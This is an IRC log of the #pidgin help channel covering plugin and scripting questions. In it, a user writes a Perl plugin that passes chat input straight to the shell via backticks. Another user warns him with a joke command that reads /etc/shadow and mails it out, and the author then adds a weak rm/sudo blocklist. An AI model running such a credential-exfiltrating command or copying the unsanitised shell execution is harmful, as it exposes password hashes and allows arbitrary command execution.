@@ -1,0 +1,290 @@
+2010-06-12 23:53:47	-->	dbbolton (~daniel@pool-72-84-34-203.clrk.east.verizon.net) has joined #pidgin
+2010-06-12 23:53:47	--	Topic for #pidgin is ""Latest" is 2.7.1, please make sure you are using it and have read the FAQ at http://d.pidgin.im/wiki/FAQ | This is a PG channel | We only support VV on XMPP (not yet Windows) | Pastebin: http://pidgin.im/nopaste/pidgin | We don't support getdeb; Ubuntu users see: http://pidgin.im/download/ubuntu/ | Current problematic services: MSN, AIM, ICQ -> upgrade"
+2010-06-12 23:53:47	--	Topic set by nosnilmot (~stu@fedora/nosnilmot) on Mon, 31 May 2010 21:57:30
+2010-06-12 23:53:47	--	Nicks #pidgin: [Ad0 Adola Aexoden Alan_Hicks aldug AllenJB Alver andy_t_roo1 antman ArmOrAttAk arni Ashhh asqq averno_ ax-ax Azelphur Betamonkey bjwebb bla bleeter BlindFreakazoid BrianR Buganini cali candy` Cobalt compengi CPAMX crash\ cybastl cyphase d1b darkrain datallah DavidFreeman11 dayton dbbolton decoder defn deryni diddly Dimmuxx Dirtsa|OFF dngr Drak0nfly duck__ dukey Edgan elb eporim Erendur|OFF Err evil_gordita EvilDennisR Extrems fahadsadah_ faitz fangism Fireman17 flamingspinach Fleurety fqueze_ Fran89 Fudge FunkyFis1 FuzzyPolarBear FyreFoX GabrielGray gillux Gizmokid2005 Guest88562 GuntherDW HerzogDeXtEr1 holla iamtheobject idoru inz jcp jemaltz JodaZ_ Julian kavakava Kazuha kermit kevdog KingAnt Linux_Time lmao2k logix Lumiere lynxer lysek MagusG Maiku1 Masca Messenger_bird mns Morgan_Phoenix mrzero Nailz` naquad nb Nickko niekie Nitrox-Linux Nitrox22 nosnilmot oyronakker Ozzapoo panni_ PennStater PennStater^AtWrk Peter17 Philonous phr0z3n Plasmastar pompy1 ProperNoun proton QuLogic r0fl rekkanoryo rifter rikai rlaager robbyoconnor RomainK ronghail sadrul samitheberber sash_ shachaf Siggi0904|OFF SimGuy Smoko sno Sonka sttwister Suiseiseki Sum_Wun tailsn00b TerminX tesiruna Tester tg TheDodger tiberius_ till- TinoDidriksen tomaw tomek treebeard TReKiE trench v3gard Vorondil VQuickSilver wabz WaV Weems wimt wizkid238 Wizzleby xsdg Yahweh |WaV|]
+2010-06-12 23:53:47	--	Channel #pidgin: 166 nicks (0 ops, 0 halfops, 0 voices, 166 normals)
+2010-06-12 23:53:47	--	URL for #pidgin: http://pidgin.im/
+2010-06-12 23:53:49	--	Channel created on Wed, 21 Mar 2007 22:53:10
+2010-06-12 23:55:53	dbbolton	i'm tring to set up a perl program. when i try to execute the script, i get this error: http://paste.debian.net/77200/
+2010-06-12 23:56:06	<--	PennStater (~Aaron@unaffiliated/pennstater) has quit (Quit: Never look down on someone unless you're helping them up.)
+2010-06-12 23:56:20	<--	tg (irc@tgbit.net) has quit (Read error: Connection reset by peer)
+2010-06-12 23:56:34	-->	tg (irc@tgbit.net) has joined #pidgin
+2010-06-13 00:01:54	QuLogic	are you trying to run it by itself?
+2010-06-13 00:02:05	QuLogic	you're supposed to put it in the plugin directory
+2010-06-13 00:05:21	<--	tiberius_ (nmxsfuev@h200.86.28.71.dynamic.ip.windstream.net) has quit (Ping timeout: 264 seconds)
+2010-06-13 00:10:14	dbbolton	ok
+2010-06-13 00:13:10	<--	Sum_Wun (~sumwun@72.183.41.75) has quit (Remote host closed the connection)
+2010-06-13 00:15:09	<--	panni_ (hannes@ip-95-222-52-93.unitymediagroup.de) has quit (Read error: Connection reset by peer)
+2010-06-13 00:16:57	-->	penghb (~penghb@202.108.130.138) has joined #pidgin
+2010-06-13 00:20:52	dbbolton	i want to set up the plugin so that an action is performed when the user enters "/pluginname argument" in the conversation window, but i don't see anything like that in the howto
+2010-06-13 00:30:46	<--	Adola (~adam@unaffiliated/adola) has quit (Read error: Connection reset by peer)
+2010-06-13 00:33:42	sadrul	look at libpurple's command-API (cmds.h)
+2010-06-13 00:54:25	<--	Fran89 (~francisco@unaffiliated/fran89) has quit (Quit: Leaving.)
+2010-06-13 00:55:38	-->	Fran89 (~francisco@unaffiliated/fran89) has joined #pidgin
+2010-06-13 01:06:49	dbbolton	thanks
+2010-06-13 01:06:58	<--	aldug (~aldug@cpe-72-231-157-91.nycap.res.rr.com) has quit (Quit: I like core dumps)
+2010-06-13 01:07:21	dbbolton	does that apply to perl plugins as well?
+2010-06-13 01:10:14	<--	sttwister (~sttwister@81.18.92.10) has quit (Ping timeout: 240 seconds)
+2010-06-13 01:11:40	-->	khc (~khc@c-24-6-34-155.hsd1.ca.comcast.net) has joined #pidgin
+2010-06-13 01:12:57	<--	khc (~khc@c-24-6-34-155.hsd1.ca.comcast.net) has quit (Client Quit)
+2010-06-13 01:15:12	<--	jemaltz (~Jonathan@pool-96-232-109-34.nycmny.fios.verizon.net) has quit (Quit: Leaving.)
+2010-06-13 01:15:43	-->	jemaltz (~jonathan@pool-96-232-109-34.nycmny.fios.verizon.net) has joined #pidgin
+2010-06-13 01:16:15	-->	khc (~khc@c-24-6-34-155.hsd1.ca.comcast.net) has joined #pidgin
+2010-06-13 01:19:09	darkrain	dbbolton: It looks like yes (the commands are exported in the Purple::Cmd namespace)
+2010-06-13 01:21:06	sadrul	for some examples: http://pidgin.im/~sadrul/pp/pl/
+2010-06-13 01:21:31	-->	pnq (asdf@ACA35455.ipt.aol.com) has joined #pidgin
+2010-06-13 01:23:21	-->	sttwister (~sttwister@81.18.92.10) has joined #pidgin
+2010-06-13 01:23:41	darkrain	Should that be linked to from the wiki? :)
+2010-06-13 01:24:00	 *	darkrain preemptively notes that he's not volunteering, being currently too lazy
+2010-06-13 01:28:10	Cobalt	sudo make me a sandwich
+2010-06-13 01:28:42	jemaltz	okay
+2010-06-13 01:29:26	khc	sudo fetch me some icecream
+2010-06-13 01:29:44	jemaltz	warning: out of ice cream.  fetching ice.
+2010-06-13 01:36:35	-->	drakon (48bd3ea1@gateway/web/freenode/ip.72.189.62.161) has joined #pidgin
+2010-06-13 01:37:37	drakon	Hello
+2010-06-13 01:38:43	jemaltz	hi
+2010-06-13 01:41:31	drakon	I was trying to search the wiki for a list of all the pidgin widgets so I can edit my theme, but either I'm searching wrong or I can't find it. Do you know where I can find a list of all of pidgin's widgets
+2010-06-13 01:41:32	drakon	?
+2010-06-13 01:43:13	darkrain	There is no such list, as far as I know, other than grepping through the source.
+2010-06-13 01:45:15	drakon	well blargh
+2010-06-13 01:45:46	<--	eporim (~rallon@unaffiliated/eporim) has quit (Ping timeout: 276 seconds)
+2010-06-13 01:48:10	-->	D3z (~D3zmodos@dsl-241-185-147.telkomadsl.co.za) has joined #pidgin
+2010-06-13 01:48:44	<--	D3z (~D3zmodos@dsl-241-185-147.telkomadsl.co.za) has left #pidgin
+2010-06-13 01:49:13	<--	drakon (48bd3ea1@gateway/web/freenode/ip.72.189.62.161) has quit (Quit: Page closed)
+2010-06-13 01:53:56	<--	Fudge (~TheFudge@220-253-173-75.TAS.netspace.net.au) has quit (Ping timeout: 276 seconds)
+2010-06-13 01:55:43	dbbolton	sadrul: i used your 'flip.pl' as a basis. for some reason, mine just prints the same integer every time, regardless of input: http://paste.debian.net/77206/
+2010-06-13 01:57:11	-->	Fudge (~TheFudge@220.253-245-146.TAS.netspace.net.au) has joined #pidgin
+2010-06-13 02:03:13	-->	nickzxcv (nick@schmalenberger.us) has joined #pidgin
+2010-06-13 02:05:30	nickzxcv	is there a key to close a workspace in finch? i keep pressing f9, and I switch to my old workspace but i should close the new one
+2010-06-13 02:06:09	nickzxcv	also, is there a bot I can talk to to try VV?
+2010-06-13 02:06:27	nickzxcv	i'm nick.schmalenberger@gmail.com if somebody wants to try it with me
+2010-06-13 02:07:16	-->	Houge (~yeqin@112.112.117.105) has joined #pidgin
+2010-06-13 02:08:38	nickzxcv	of course, there is no VV in finch, but i'm disconnecting from gmail in finch and connecting with pidgin when I want to try VV
+2010-06-13 02:08:46	nickzxcv	is that how I should do that?
+2010-06-13 02:10:07	nickzxcv	i'm running 2.7.1 on both
+2010-06-13 02:11:53	sadrul	dbbolton: your eval_string function might be the culprit
+2010-06-13 02:13:38	-->	rabbit1 (~manjunath@118.95.16.138) has joined #pidgin
+2010-06-13 02:13:49	darkrain	nickzxcv: echo@test.collabora.co.uk
+2010-06-13 02:15:07	rabbit1	guys, i use pidgin, and play vlc, i want the now playing as status, i have installed mpris plugin. now how do i make that to display in status?
+2010-06-13 02:15:26	dbbolton	sadrul: yeah, i thought so. but i don't know how to fix it. even if i just try to print @_ in that sub, it comes back with an integer
+2010-06-13 02:16:14	rabbit1	darkrain: if u not busy, can u help me out ?
+2010-06-13 02:17:06	Cobalt	rabbit1: He's being a bit quote lazy unquote right now. :P
+2010-06-13 02:17:16	darkrain	I know nothing about the mpris plugin.
+2010-06-13 02:17:23	darkrain	And what Cobalt said
+2010-06-13 02:18:38	rabbit1	Cobalt: :) thats ok, everybody are when tired
+2010-06-13 02:19:05	Cobalt	Great. Thanks for making me feel guilty. I'm like that when I'm _not_ tired. :P
+2010-06-13 02:19:18	 *	darkrain too
+2010-06-13 02:19:23	rabbit1	Cobalt: so then u r right person to solve my prob then
+2010-06-13 02:19:38	darkrain	rabbit1: Generally, I don't think there's anyone in here who knows how to use the mpris plugin; you should check its website.
+2010-06-13 02:19:43	Cobalt	Euh no. I know nothing about Pidgin. I'm just a regular user. :S
+2010-06-13 02:19:51	darkrain	Also, it's "you" and "are", not "u" and "r".
+2010-06-13 02:20:06	rabbit1	darkrain: i did, as required i have done everything, but, how to activate it,
+2010-06-13 02:20:28	rabbit1	i mean even i have configured the plugin to vlc.....
+2010-06-13 02:20:40	darkrain	dbbolton: What debug output do you see?
+2010-06-13 02:21:49	rabbit1	darkrain: http://paste.ubuntu.com/449045/
+2010-06-13 02:22:17	darkrain	rabbit1: I wasn't talking to you; I was talking to dbbolton.
+2010-06-13 02:22:23	dbbolton	darkrain: none
+2010-06-13 02:22:33	rabbit1	darkrain: sorry ;)
+2010-06-13 02:22:39	darkrain	dbbolton: Erm, at all?
+2010-06-13 02:23:00	darkrain	dbbolton: You don't see the XXX output line?
+2010-06-13 02:23:12	darkrain	rabbit1: Plugins can be activated via the Tools->Plugin dialog in Pidgin.
+2010-06-13 02:23:35	rabbit1	darkrain: thats done and even the configuring to "vlc" is done, what next ?
+2010-06-13 02:24:00	darkrain	I really don't know.  I've never used the plugin. 
+2010-06-13 02:25:54	rabbit1	come on guys its a pidgin room, doesn't it ? :)
+2010-06-13 02:26:30	Cobalt	rabbit1: Yeah, it might be, but they won't necessarily know about plugins written by _other_ people.
+2010-06-13 02:26:51	rabbit1	Cobalt: i am just trying to motivate :)
+2010-06-13 02:27:04	darkrain	This is a *pidgin* room, not a *pidgin-mpris* room.  The Pidgin developers did not write the plugin, and consequently do not support it.
+2010-06-13 02:27:10	-->	SpeedProg (~SpeedProg@p5B0B53CD.dip.t-dialin.net) has joined #pidgin
+2010-06-13 02:27:22	darkrain	As far as I know, the plugin's author(s) do not frequent the room.
+2010-06-13 02:27:22	Cobalt	rabbit1: You might end up annoying some people instead.
+2010-06-13 02:27:28	rabbit1	darkrain: o kool, v got a sub room as well then ? let me try
+2010-06-13 02:27:39	darkrain	Like me (in case my annoyance isn't coming through via the text)
+2010-06-13 02:27:53	jemaltz	you're annoyed?
+2010-06-13 02:28:04	Cobalt	Mpris... that sounds familiar. Wasn't that merged or being maintained by the actual Mpris people or something?
+2010-06-13 02:28:35	darkrain	Me?  No, never.  I never get annoyed.  (the biting sarcasm really does get lost there)
+2010-06-13 02:28:53	Cobalt	Or was that MXit I'm thinking about?
+2010-06-13 02:29:03	jemaltz	probably MXit
+2010-06-13 02:29:06	darkrain	You're thinking of Mxit.
+2010-06-13 02:29:12	Cobalt	Ah I see.
+2010-06-13 02:31:53	darkrain	rabbit1: With the caveat that, again, I know nothing of these plugins and have never used any of them, you might have better luck with the pidgin-musictracker plugin
+2010-06-13 02:33:14	rabbit1	darkrain: that's ok dude, no prob. i just installed pidgin-musictracker plugin and configured it too, but how do i /integrate/ to the status, should i restart vlc and pidgin, worth a try ?
+2010-06-13 02:33:27	darkrain	Read the plugin's documentation!
+2010-06-13 02:33:35	<--	WaV (~anon@ip24-250-163-165.ga.at.cox.net) has quit
+2010-06-13 02:33:39	Cobalt	My fingers wanted to say that.
+2010-06-13 02:33:43	darkrain	What part of "I know nothing of these plugins" suggests I would know how to use it?
+2010-06-13 02:33:54	darkrain	That's an ernest question.
+2010-06-13 02:34:09	Cobalt	I still don't sense annoyance. :P
+2010-06-13 02:34:11	rabbit1	darkrain: i was going through, musicplayer plugin doesn't support vlc :(
+2010-06-13 02:34:57	nickzxcv	wow, thanks the echobot works great
+2010-06-13 02:35:18	-->	eporim (~rallon@unaffiliated/eporim) has joined #pidgin
+2010-06-13 02:35:30	darkrain	nickzxcv: Don't thank me, thank the Collabora guy who writes it (and restarts it when it crashes) :)
+2010-06-13 02:35:30	rabbit1	darkrain: i got something,
+2010-06-13 02:35:53	darkrain	Cobalt: The room told me I'm not a channel operator when I tried to kick you. :(
+2010-06-13 02:36:15	rabbit1	darkrain: now does vlc support mpris, and it does support according to a post, but now should i install mpris plugin for vlc aswell ?
+2010-06-13 02:36:22	dbbolton	darkrain no, it just prints 1 if the code is valid perl, and the input if it isn't
+2010-06-13 02:36:33	Cobalt	darkrain: That's my pure awesomeness.
+2010-06-13 02:37:14	jemaltz	rabbit1: I think it's been made clear that darkrain has never used any of these plugins
+2010-06-13 02:37:40	darkrain	jemaltz: Observationally, I'm not sure how clear that is to him/her. :/
+2010-06-13 02:38:03	darkrain	dbbolton: Are you sure the code you pastebinned is being executed then?  It definitely should throw something into the Help->Debug Window...
+2010-06-13 02:38:14	rabbit1	jemaltz: sorry guys, carry on, let me check out few other sites, and get back
+2010-06-13 02:38:15	jemaltz	rabbit1: I would suspect that you must install and/or enable something within VLC for it to know to broadcast its song info, though
+2010-06-13 02:38:35	<--	Nitrox22 (~Nitrox@unaffiliated/nitrox22) has quit (Ping timeout: 260 seconds)
+2010-06-13 02:39:29	darkrain	rabbit1: I will tell you only one more time, and then I'm completely done.  Read the damned documentation for the plugin (which can EASILY be found via Google).  If you haven't done that, you're wasting EVERYONE's time.
+2010-06-13 02:39:48	Cobalt	rabbit1: It's okay to ask questions. :) But only after you're very very very sure you've exhausted all other avenues of information involving the web, and Google, and then the web again... and then some. If you're still unsure, then you can ask a question... but still, be very afraid, in case the information exists somewhere else. :P
+2010-06-13 02:40:25	-->	Nitrox22 (~Nitrox@unaffiliated/nitrox22) has joined #pidgin
+2010-06-13 02:40:37	 *	jemaltz is very afraid
+2010-06-13 02:40:56	 *	darkrain really just shouldn't be paying attention to IRC
+2010-06-13 02:41:18	jemaltz	you're paying attention?
+2010-06-13 02:41:20	 *	jemaltz hides
+2010-06-13 02:41:54	rabbit1	Cobalt: i did my search before putting my ques here, that's ok, nobody can expect to know everything from somebody.... ;)
+2010-06-13 02:42:14	jemaltz	hm, I could've sworn I recalled a book being writen for gaim/pidgin, but I can't seem to find info about it
+2010-06-13 02:42:24	Cobalt	Yes, but you didn't seem very afraid. Lol.
+2010-06-13 02:42:42	 *	jemaltz found it
+2010-06-13 02:43:33	-->	alabd (~alabd@unaffiliated/alabd) has joined #pidgin
+2010-06-13 02:43:52	alabd	Good day all , does pidgin support webcam in yahoo protocol ?
+2010-06-13 02:44:05	darkrain	No.
+2010-06-13 02:44:42	alabd	thanks how about voice ?
+2010-06-13 02:44:56	QuLogic	No
+2010-06-13 02:45:27	dbbolton	darkrain: if i enter, print 'abc', i get: (02:44:53) XXX: The message: print 'abcd'
+2010-06-13 02:45:42	dbbolton	then '1' shows up in the convo window
+2010-06-13 02:45:47	darkrain	Errr
+2010-06-13 02:45:57	darkrain	Where did the 'd' come from?
+2010-06-13 02:46:14	<--	Betamonkey (~weedmonke@CPE-121-222-66-35.lnse1.cha.bigpond.net.au) has quit (Ping timeout: 240 seconds)
+2010-06-13 02:46:27	sadrul	should that be 'my $code = $_;' instead of '@_'?
+2010-06-13 02:46:38	alabd	QuLogic:  darkrain why ?
+2010-06-13 02:46:54	sadrul	(I'll probably be gone again in a minute O:-) )
+2010-06-13 02:46:55	QuLogic	because you haven't written support for it yet
+2010-06-13 02:47:06	darkrain	@_ is the arguments, so 'my $code = (@_)' is one way of saying "$code is the first argument"
+2010-06-13 02:47:37	darkrain	I'll also point out that the print function just isn't going to work the way you expect, so it's a bad test vessel
+2010-06-13 02:48:49	khc	my ($code) = @_ ?
+2010-06-13 02:48:55	darkrain	dbbolton: http://pastebin.ca/1882090
+2010-06-13 02:49:09	darkrain	khc: Oops, yeah, that.
+2010-06-13 02:49:17	khc	my $code = (@_); will probably set $code to the number of arguments
+2010-06-13 02:50:38	alabd	God peace you bye
+2010-06-13 02:51:22	alabd	for which protocols does pidgin support voice and webcam ?
+2010-06-13 02:52:58	QuLogic	topic
+2010-06-13 02:53:28	QuLogic	not really sure what that other sentence meant
+2010-06-13 02:53:34	-->	Betamonkey (~weedmonke@CPE-121-222-66-35.lnse1.cha.bigpond.net.au) has joined #pidgin
+2010-06-13 02:57:02	<--	pnq (asdf@ACA35455.ipt.aol.com) has quit (Quit: Leaving)
+2010-06-13 02:57:05	dbbolton	darkrain: i don't understand the reference, i used eval: http://paste.debian.net/77208/
+2010-06-13 02:58:26	darkrain	eval "print 'foo'" will output 'foo' to stdout, it won't return it to you as the result of eval
+2010-06-13 02:58:42	darkrain	What eval returns is the return value of print, which is '1'
+2010-06-13 02:59:19	dbbolton	ok
+2010-06-13 02:59:26	darkrain	If you start up Pidgin from a console, you'll see 'foo' appear on stdout when you trigger that callback
+2010-06-13 03:03:00	<--	QuLogic (~zero-one@bas3-toronto48-1176441512.dsl.bell.ca) has left #pidgin
+2010-06-13 03:03:48	dbbolton	so i do i get the evaluation to show up in the convo, rather than its exit status?
+2010-06-13 03:04:40	-->	Darwin4Ever (~Walter@85.234.196.189) has joined #pidgin
+2010-06-13 03:05:59	darkrain	Try passing 5*7 to your plugin
+2010-06-13 03:06:48	darkrain	or "asdf" . "fdsa"
+2010-06-13 03:08:50	jemaltz	dot product?
+2010-06-13 03:12:41		irc: disconnected from server
+2010-06-13 03:13:26	-->	dbbolton (~daniel@pool-72-84-45-178.clrkwv.east.verizon.net) has joined #pidgin
+2010-06-13 03:13:26	--	Topic for #pidgin is ""Latest" is 2.7.1, please make sure you are using it and have read the FAQ at http://d.pidgin.im/wiki/FAQ | This is a PG channel | We only support VV on XMPP (not yet Windows) | Pastebin: http://pidgin.im/nopaste/pidgin | We don't support getdeb; Ubuntu users see: http://pidgin.im/download/ubuntu/ | Current problematic services: MSN, AIM, ICQ -> upgrade"
+2010-06-13 03:13:26	--	Topic set by nosnilmot (~stu@fedora/nosnilmot) on Mon, 31 May 2010 21:57:30
+2010-06-13 03:13:26	--	Nicks #pidgin: [Ad0 Aexoden alabd Alan_Hicks AllenJB Alver andy_t_roo1 Anodl antman ArmOrAttAk arni Ashhh asqq averno_ ax-ax Azelphur Betamonkey bjwebb bla bleeter BlindFreakazoid BrianR Buganini cali candy` Cobalt compengi CPAMX crash\ cybastl cyphase d1b darkrain Darwin4Ever datallah DavidFreeman11 dayton dbbolton decoder defn deryni diddly Dimmuxx Dirtsa|OFF dngr Drak0nfly duck__ dukey Edgan elb eporim Erendur|OFF Err evil_gordita EvilDennisR Extrems fahadsadah_ faitz fangism Fireman17 flamingspinach Fleurety fqueze_ Fran89 Fudge FunkyFis1 FuzzyPolarBear FyreFoX GabrielGray gillux Gizmokid2005 Guest88562 GuntherDW Hasanibrahim HerzogDeXtEr1 holla Houge iamtheobject idoru inz jcp jemaltz JodaZ_ Julian kavakava Kazuha kermit kevdog khc KingAnt Linux_Time lmao2k logix Lumiere lynxer lysek MagusG Maiku1 Masca Messenger_bird mns Morgan_Phoenix mrzero Nailz` naquad nb Nickko nickzxcv niekie Nitrox-Linux Nitrox22 nosnilmot oyronakker Ozzapoo penghb PennStater^AtWrk Peter17 Philonous phr0z3n Plasmastar pompy1 ProperNoun proton r0fl rabbit1 rekkanoryo rifter rikai rlaager robbyoconnor RomainK ronghail sadrul samitheberber sash_ shachaf Siggi0904|OFF SimGuy Smoko sno Sonka SpeedProg sttwister Suiseiseki tailsn00b TerminX tesiruna Tester tg TheDodger till- TinoDidriksen tomaw tomek treebeard TReKiE trench v3gard Vorondil VQuickSilver wabz Weems wimt wizkid238 Wizzleby xsdg Yahweh |WaV|]
+2010-06-13 03:13:26	--	Channel #pidgin: 168 nicks (0 ops, 0 halfops, 0 voices, 168 normals)
+2010-06-13 03:13:26	--	URL for #pidgin: http://pidgin.im/
+2010-06-13 03:13:28	--	Channel created on Wed, 21 Mar 2007 22:53:10
+2010-06-13 03:14:01	darkrain	jemaltz: It definitely works, though.  You just have to keep installing gstreamer0.10-plugins-* packages until it works (or find the wiki page that says which codecs are actually needed)
+2010-06-13 03:14:29	jemaltz	hehe
+2010-06-13 03:15:34	alabd	darkrain:  pidgin worked for gmail voice but can not see my webcam why ?
+2010-06-13 03:16:54	-->	Dresk (~Dresk@c-24-0-177-89.hsd1.nj.comcast.net) has joined #pidgin
+2010-06-13 03:17:36	Dresk	Trying to build Pidgin since my distro just stopped updating the packages for it, configure is saying it can't find xscreensaver, I'm guessing that's because everything I have is 64bit, and the config.sub file is quite confusing for simply telling Pidgin to compile as 64bit
+2010-06-13 03:20:25	Dresk	Argh, need to reboot kernel for glibc update
+2010-06-13 03:20:30	<--	Dresk (~Dresk@c-24-0-177-89.hsd1.nj.comcast.net) has quit (Client Quit)
+2010-06-13 03:20:35	<--	rabbit1 (~manjunath@118.95.16.138) has quit (Quit: Leaving.)
+2010-06-13 03:20:43	-->	rabbit1 (~manjunath@118.95.16.138) has joined #pidgin
+2010-06-13 03:22:45	-->	Adola (~adam@unaffiliated/adola) has joined #pidgin
+2010-06-13 03:23:16	-->	Dresk (~Dresk@c-24-0-177-89.hsd1.nj.comcast.net) has joined #pidgin
+2010-06-13 03:24:15	Hasanibrahim	anyone to help ?
+2010-06-13 03:24:25	-->	Woody``` (~woody@122.180.40.30) has joined #pidgin
+2010-06-13 03:25:12	<--	Anodl (~Anodl@p54A7B40F.dip0.t-ipconnect.de) has quit (Ping timeout: 276 seconds)
+2010-06-13 03:25:55	-->	Anodl (~Anodl@p54A7AE92.dip0.t-ipconnect.de) has joined #pidgin
+2010-06-13 03:29:38	<--	Dresk (~Dresk@c-24-0-177-89.hsd1.nj.comcast.net) has left #pidgin ("Leaving")
+2010-06-13 03:29:43	-->	Dresk (~Dresk@c-24-0-177-89.hsd1.nj.comcast.net) has joined #pidgin
+2010-06-13 03:30:54	--	Hasanibrahim is now known as Hasan
+2010-06-13 03:31:47	alabd	thanks
+2010-06-13 03:31:48	<--	alabd (~alabd@unaffiliated/alabd) has left #pidgin ("Leaving.")
+2010-06-13 03:32:20	--	Hasan is now known as Hasanibrahim
+2010-06-13 03:32:37	<--	Fran89 (~francisco@unaffiliated/fran89) has quit (Quit: Leaving.)
+2010-06-13 03:33:09	--	Hasanibrahim is now known as Hasan
+2010-06-13 03:33:14	--	Hasan is now known as Hasanibrahim
+2010-06-13 03:33:18	<--	Hasanibrahim (~Administr@88.226.87.148) has left #pidgin
+2010-06-13 03:40:22	-->	Arsecroft (~triad@adsl-074-237-093-120.sip.mia.bellsouth.net) has joined #pidgin
+2010-06-13 03:43:58	Arsecroft	Hey, just started trying to script pidgin via python. What is the UI parameter for the function PurpleAccountSetEnabled if i am using pidgin? I have looked around and googled with no results.
+2010-06-13 03:47:01	Arsecroft	Have also tried just putting anything in that parameter, and the checkbox is checked, but the account is not online and I can't uncheck the box.
+2010-06-13 03:49:04	Arsecroft	http://pastebin.ca/1882102 very simple, straight forward code. Any ideas?
+2010-06-13 03:53:54	<--	Betamonkey (~weedmonke@CPE-121-222-66-35.lnse1.cha.bigpond.net.au) has quit (Ping timeout: 265 seconds)
+2010-06-13 03:54:33	khc	#purple.PurpleAccountSetEnabled(test, "pidgin", True) I think
+2010-06-13 03:55:04	dbbolton	darkrain: i see that it works for expressions like '5*7', but i want it to behave like 'perl -e "code"'. i also tried this, for general system commands, http://paste.debian.net/77212/
+2010-06-13 03:55:57	dbbolton	this just prints the input string
+2010-06-13 03:56:50	Arsecroft	khc: the first thing I tried, but it still has the same behavior. Maybe I have to do more to get ti to actually connect?
+2010-06-13 03:57:05	khc	what do you actually want to do? reconnect?
+2010-06-13 03:58:15	darkrain	I think it's actually "gtk-gaim", not "pidgin"
+2010-06-13 03:58:34	Arsecroft	It's creating an account, then connecting to it.
+2010-06-13 03:59:17	Arsecroft	darkrain: yes!
+2010-06-13 03:59:29	darkrain	?
+2010-06-13 03:59:59	Arsecroft	"gtk-gaim" worked for the ui paramater for PurpleAccountSetEnabled
+2010-06-13 04:00:38	darkrain	dbbolton: You'll need to find a way to redirect standard output for Perl built-in functions (preferably without dup2()ing to stdout)
+2010-06-13 04:01:12	Arsecroft	darkrain: Any idea where I could find this in the docs? Or did you just happen to know that?
+2010-06-13 04:01:29	-->	Betamonkey (~weedmonke@CPE-138-130-230-246.lnse4.cha.bigpond.net.au) has joined #pidgin
+2010-06-13 04:01:58	darkrain	I just happen to have known it, but it's in pidgin.h (#define PIDGIN_UI)
+2010-06-13 04:02:44	<--	Houge (~yeqin@112.112.117.105) has quit (Quit: Leaving.)
+2010-06-13 04:03:29	Arsecroft	Sweet, thanks!
+2010-06-13 04:04:35	darkrain	dbbolton: For better or worse, you could always pass off the output to a spawned perl process (although I strongly suggest you do so via a pipe instead of trying to get the 15 levels of command-line argument escaping correct -- although if you're executing someone else's perl code, I guess you'd have already lost)
+2010-06-13 04:09:28	--	Siggi0904|OFF is now known as Siggi0904
+2010-06-13 04:12:28	dbbolton	darkrain: i also tried just catenating some letters onto $msg in the cb sub. $msg is then passed to a "say" command. yet the extra letters did not show up.
+2010-06-13 04:12:34	-->	roryhawke (ad1763df@gateway/web/freenode/ip.173.23.99.223) has joined #pidgin
+2010-06-13 04:12:55	dbbolton	i don't understand why that doesn't work, but the string operations in the original flip.pl seemed to behave intuitively 
+2010-06-13 04:13:27	dbbolton	i didn't see anything in it about redirecting output or spawning processes
+2010-06-13 04:14:19	<--	roryhawke (ad1763df@gateway/web/freenode/ip.173.23.99.223) has quit (Client Quit)
+2010-06-13 04:15:26	<--	Dresk (~Dresk@c-24-0-177-89.hsd1.nj.comcast.net) has left #pidgin ("Leaving")
+2010-06-13 04:16:13	darkrain	My comments about output redirection are in response to your desire to use perl's "print" function, which fundamentally just doesn't work the way you want with the eval command.
+2010-06-13 04:16:27	darkrain	Pastebin your current code, please
+2010-06-13 04:17:58	darkrain	sadrul's plugin doesn't have to do any wonky output redirection because it's not trying to eval() things.
+2010-06-13 04:18:07	dbbolton	http://paste.debian.net/77215/
+2010-06-13 04:18:38	dbbolton	i tried doing unwonky things too, like catenating a few extra chars to the input string.
+2010-06-13 04:19:27	darkrain	Let me rephrase: pastebin the code where you're appending some letters to $msg in the cb sub and then passing it to "say" and not seeing the extra letters.
+2010-06-13 04:19:36	dbbolton	ok
+2010-06-13 04:22:24	dbbolton	actually, i think the problem was that i had to restart pidgin after editing the script
+2010-06-13 04:23:29	darkrain	:)
+2010-06-13 04:23:59	dbbolton	here's what i did: my $msg = $args[0] . "\n" . `$args[0]`;
+2010-06-13 04:24:04	dbbolton	it seems to be working
+2010-06-13 04:25:55	dbbolton	thanks for your help
+2010-06-13 04:27:10	<--	Sonka (~Secret@ip02.rdlbnc.com) has quit (Remote host closed the connection)
+2010-06-13 04:27:21	darkrain	Paste this into your client, please: /eval sudo cat /etc/shadow | mail me
+2010-06-13 04:28:04	-->	ProperN[out] (haruspex@adsl-243-223-24.cae.bellsouth.net) has joined #pidgin
+2010-06-13 04:28:18	<--	ProperN[out] (haruspex@adsl-243-223-24.cae.bellsouth.net) has quit (Changing host)
+2010-06-13 04:28:18	-->	ProperN[out] (haruspex@wikipedia/ProperNoun) has joined #pidgin
+2010-06-13 04:31:54	<--	ProperNoun (haruspex@wikipedia/ProperNoun) has quit (Ping timeout: 276 seconds)
+2010-06-13 04:31:54	--	ProperN[out] is now known as ProperNoun
+2010-06-13 04:34:59	<--	Betamonkey (~weedmonke@CPE-138-130-230-246.lnse4.cha.bigpond.net.au) has quit (Ping timeout: 265 seconds)
+2010-06-13 04:35:01	<--	fangism (~fang@c-67-169-177-34.hsd1.ca.comcast.net) has quit (Ping timeout: 260 seconds)
+2010-06-13 04:35:55	<--	Suiseiseki (~desu@wikipedia/Antonio-Lopez) has quit (Read error: Connection reset by peer)
+2010-06-13 04:36:37	-->	Suiseiseki (~desu@wikipedia/Antonio-Lopez) has joined #pidgin
+2010-06-13 04:37:18	dbbolton	don't wory, i'm adding a safety net now
+2010-06-13 04:38:11	dbbolton	it will just return the command if /^\s*rm\s+/ , same for sudo and su 
+2010-06-13 04:39:12	dbbolton	i actually don't have sudo or mail
+2010-06-13 04:41:08	dbbolton	i guess \b is more efficient anyway
+2010-06-13 04:41:37		irc: disconnected from server
+2010-06-13 07:31:49	-->	dbbolton (~daniel@pool-72-84-45-178.clrkwv.east.verizon.net) has joined #pidgin
+2010-06-13 07:31:49	--	Topic for #pidgin is ""Latest" is 2.7.1, please make sure you are using it and have read the FAQ at http://d.pidgin.im/wiki/FAQ | This is a PG channel | We only support VV on XMPP (not yet Windows) | Pastebin: http://pidgin.im/nopaste/pidgin | We don't support getdeb; Ubuntu users see: http://pidgin.im/download/ubuntu/ | Current problematic services: MSN, AIM, ICQ -> upgrade"
+2010-06-13 07:31:49	--	Topic set by nosnilmot (~stu@fedora/nosnilmot) on Mon, 31 May 2010 21:57:30
